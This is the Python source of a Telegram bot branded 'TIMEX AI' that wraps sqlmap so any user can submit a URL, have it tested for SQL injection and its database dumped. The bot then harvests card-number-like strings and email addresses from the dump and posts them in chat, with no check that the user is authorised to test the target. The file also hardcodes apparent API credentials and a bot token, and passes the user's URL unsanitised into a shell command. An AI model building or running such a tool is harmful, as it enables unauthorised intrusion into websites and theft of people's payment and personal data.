#!/usr/bin/env python3
"""
🔥 TIMEX AI - COMPLETE BOT 🔥
👑 CREATOR: @timex4sure
"""

import asyncio
import requests
import re
import time
import socket
import dns.resolver
import sqlite3
import urllib3
import threading
import subprocess
import sys
import os
from datetime import datetime
from telethon import TelegramClient, events, Button
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# CONFIG - Render pe Environment Variables se le raha hai
# ============================================
API_ID = int(os.environ.get('API_ID', 36042832))
API_HASH = os.environ.get('API_HASH', '6dbff02d4cacd9f4dcbe9f7c467d8379')
BOT_TOKEN = os.environ.get('BOT_TOKEN', '8887761431:AAETYtlG76gBQ8KIY7ODNADPg6xH4rkyJtc')
OWNER = "timex4sure"

print(f"✅ API_ID: {API_ID}")
print(f"✅ BOT_TOKEN: {BOT_TOKEN[:10]}...")

# ============================================
# DATABASE
# ============================================
def init_db():
    conn = sqlite3.connect('timex.db')
    conn.execute('''CREATE TABLE IF NOT EXISTS vulns (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT, vuln_type TEXT, payload TEXT, url TEXT,
        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS extracted (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        target TEXT, data_type TEXT, data TEXT,
        time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )''')
    conn.commit()
    conn.close()
    print("✅ DB ready")

# ============================================
# SQLMAP WRAPPER
# ============================================

class SQLMAPWrapper:
    def __init__(self):
        self.results = {}
        self.output = ""
    
    def run(self, url, options=""):
        """Run sqlmap with any options"""
        cmd = f"sqlmap -u {url} {options} --batch --random-agent --threads=10 --output-dir=./output/ 2>/dev/null"
        print(f"🔧 Running: {cmd}")
        
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=120)
            self.output = result.stdout + result.stderr
            return self.output
        except subprocess.TimeoutExpired:
            return "⏳ SQLMAP TIMEOUT"
        except Exception as e:
            return f"❌ Error: {str(e)}"
    
    def scan(self, url):
        output = self.run(url, "--dbs")
        return self.parse_output(output)
    
    def dump(self, url):
        output = self.run(url, "--dump")
        return self.parse_output(output)
    
    def parse_output(self, output):
        results = {
            'vulnerable': False,
            'database': None,
            'tables': [],
            'data': []
        }
        
        if "vulnerable" in output.lower() or "parameter" in output.lower():
            results['vulnerable'] = True
        
        db_match = re.search(r"Database:\s+(\S+)", output)
        if db_match:
            results['database'] = db_match.group(1)
        
        tables = re.findall(r"\| (\w+) \|", output)
        if tables:
            results['tables'] = tables
        
        cc = re.findall(r'\b\d{15,16}\b', output)
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', output)
        
        if cc:
            results['data'].extend(cc)
        if emails:
            results['data'].extend(emails)
        
        return results

# ============================================
# TELEGRAM BOT
# ============================================

print("🤖 Creating bot...")
bot = TelegramClient('timex_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
sqlmap = SQLMAPWrapper()

@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    buttons = [
        [Button.inline("💉 SQLI SCAN", b"scan")],
        [Button.inline("📊 DUMP DATA", b"dump")],
        [Button.inline("🚀 FULL AUTO", b"full")],
        [Button.inline("🆘 HELP", b"help")]
    ]
    
    await event.reply(
        f"🔥 *TIMEX AI* 🔥\n\n"
        f"👑 *Creator:* @{OWNER}\n"
        f"💉 SQLI SCAN - Find SQL Injection\n"
        f"📊 DUMP DATA - Extract CC, Emails\n"
        f"🚀 FULL AUTO - Everything\n\n"
        f"🎁 *FREE FOR EVERYONE*\n"
        f"🔥 *Choose:*",
        buttons=buttons,
        parse_mode='md'
    )

@bot.on(events.CallbackQuery)
async def callback_handler(event):
    data = event.data.decode()
    
    if data == 'scan':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"💉 *Scanning {url}*", parse_mode='md')
                result = sqlmap.scan(url)
                text = f"💉 *SCAN RESULTS*\n\n"
                text += f"🔴 Vulnerable: {'✅ YES' if result['vulnerable'] else '❌ NO'}\n"
                if result['database']:
                    text += f"🗄️ Database: {result['database']}\n"
                if result['tables']:
                    text += f"📊 Tables: {', '.join(result['tables'][:5])}\n"
                text += f"\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'dump':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"📊 *Dumping {url}*", parse_mode='md')
                result = sqlmap.dump(url)
                text = f"📊 *DUMP RESULTS*\n\n"
                if result['data']:
                    text += f"💳 *Data:*\n"
                    for item in result['data'][:10]:
                        text += f"  • `{item}`\n"
                else:
                    text += "❌ No data found"
                text += f"\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'full':
        await event.edit("🌐 Enter URL: `https://example.com?id=1`", parse_mode='md')
        
        @bot.on(events.NewMessage)
        async def h(msg):
            url = msg.message.text.strip()
            if url:
                await msg.reply(f"🚀 *Full Auto {url}*", parse_mode='md')
                scan = sqlmap.scan(url)
                dump = sqlmap.dump(url)
                
                text = f"🚀 *FULL RESULTS*\n\n"
                text += f"💉 Vulnerable: {'✅' if scan['vulnerable'] else '❌'}\n"
                if scan['database']:
                    text += f"🗄️ Database: {scan['database']}\n"
                if dump['data']:
                    text += f"💳 Data: {len(dump['data'])} items\n"
                    for item in dump['data'][:5]:
                        text += f"  • `{item}`\n"
                text += f"\n👑 @{OWNER}"
                await msg.reply(text, parse_mode='md', buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
            else:
                await msg.reply("❌ Invalid URL!", buttons=[[Button.inline("🔙 BACK", b"back")]])
                bot.remove_event_handler(h)
    
    elif data == 'help':
        await event.edit(
            f"🆘 *TIMEX AI COMMANDS*\n\n"
            f"💉 SCAN - Find SQL Injection\n"
            f"📊 DUMP - Extract CC, Emails\n"
            f"🚀 FULL - Everything\n\n"
            f"👑 @{OWNER}",
            buttons=[[Button.inline("🔙 BACK", b"back")]],
            parse_mode='md'
        )
    
    elif data == 'back':
        await start_handler(event)

@bot.on(events.NewMessage)
async def message_handler(event):
    if event.message.text and not event.message.text.startswith('/'):
        text = event.message.text.lower()
        
        if 'scan' in text:
            url = re.search(r'https?://[^\s]+', event.message.text)
            if url:
                url = url.group()
                await event.reply(f"💉 *Scanning {url}*", parse_mode='md')
                result = sqlmap.scan(url)
                text_msg = f"💉 *SCAN RESULTS*\n\n"
                text_msg += f"🔴 Vulnerable: {'✅ YES' if result['vulnerable'] else '❌ NO'}\n"
                if result['database']:
                    text_msg += f"🗄️ Database: {result['database']}\n"
                await event.reply(text_msg, parse_mode='md')
        
        elif 'dump' in text:
            url = re.search(r'https?://[^\s]+', event.message.text)
            if url:
                url = url.group()
                await event.reply(f"📊 *Dumping {url}*", parse_mode='md')
                result = sqlmap.dump(url)
                text_msg = f"📊 *DUMP RESULTS*\n\n"
                if result['data']:
                    for item in result['data'][:5]:
                        text_msg += f"  • `{item}`\n"
                else:
                    text_msg += "❌ No data found"
                await event.reply(text_msg, parse_mode='md')

# ============================================
# MAIN FUNCTION
# ============================================

async def main():
    """Main function to run bot"""
    print("🔥 TIMEX AI Bot Starting...")
    print("🚀 Bot is running!")
    await bot.run_until_disconnected()

def start_bot():
    """Start bot in sync mode"""
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    init_db()
    start_bot()
